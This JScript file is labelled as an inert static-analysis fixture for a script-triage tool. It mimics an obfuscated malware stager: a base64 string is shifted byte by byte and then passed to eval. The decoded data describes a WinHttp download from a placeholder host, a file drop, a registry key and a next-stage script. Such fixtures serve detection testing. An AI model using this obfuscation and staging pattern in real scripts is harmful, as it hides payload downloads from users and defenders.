// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_2f6abea6 = function(v_a19c) {
  var v_b27e = [];
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push((v_a19c[i] - 6 + 256) % 256); }
  return v_b27e;
};
var recover_83d1c34e = function() {
  var packedText = "gSh5emt2eShAYShnaXd7b3hrZXhrc3V6aygyKH14b3prZWxvcmsoMihqb3l2Z3ppbmV2eHVpa3l5KDIobmd0anVsbGV5aXhvdnooYzIoZ2pndnpreChAKF1vdE56enY0XW90Tnp6dlhrd3treXo0OzQ3KDIofGdye2t5KECBKGlnc3Znb210ZW9qKEAoaWdzdmdvbXQzNzg9Zzk2ODprZygyKHt4cihAKG56enZ5QDU1Nzg9Zzk2ODprZzRrfmdzdnJrNG90fGdyb2o1PT89Pj88aWo0amd6KDIoe3lreGVnbWt0eihAKE57dHp4a3l5UmdoNTc4PWc5Njg6a2coMihsb3JrZXZnem4oQChJQGJiW3lreHliYlZ7aHJvaWJiTnt0enhreXlSZ2hiYnl6Z21rMzc4PWc5Njg6a2c0amd6KDIoeGttb3l6eH9ldmd6bihAKE5RSVtiYll1bHp9Z3hrYmJOe3R6eGt5eVJnaGJiSm95dnV5Z2hya2JiNzg9Zzk2ODprZygyKHRrfnpleXpnbWsoQCh4a3l1e3hpazN5Z3N2cms0dnk3KIMyKHl6Z21rSXV7dHooQDqD";

  var v_a19c = decodeBase64(packedText);

  var v_f602 = ["north", "south"].join(":");

  var v_b27e = [];

  for (var pass = 0; pass < 1; pass++) { v_b27e = decode_2f6abea6.call(null, v_a19c); }

  var v_c304 = v_b27e.length ? String.fromCharCode(v_b27e[0]) : "";

  for (var bi = 1; bi < v_b27e.length; bi++) { v_c304 = v_c304.concat(String.fromCharCode(v_b27e[bi])); }

  return v_c304;
};
var inspect_0e0d4af6 = function() {
  var v_d41a = eval("(" + recover_83d1c34e.call(null) + ")");
  var table = { steps: function() { return v_d41a.steps; }, values: function() { return v_d41a.values; } };
  return { steps: table.steps.call(null), adapter: v_d41a.adapter, values: table.values.call(null), stageCount: v_d41a.stageCount };
};
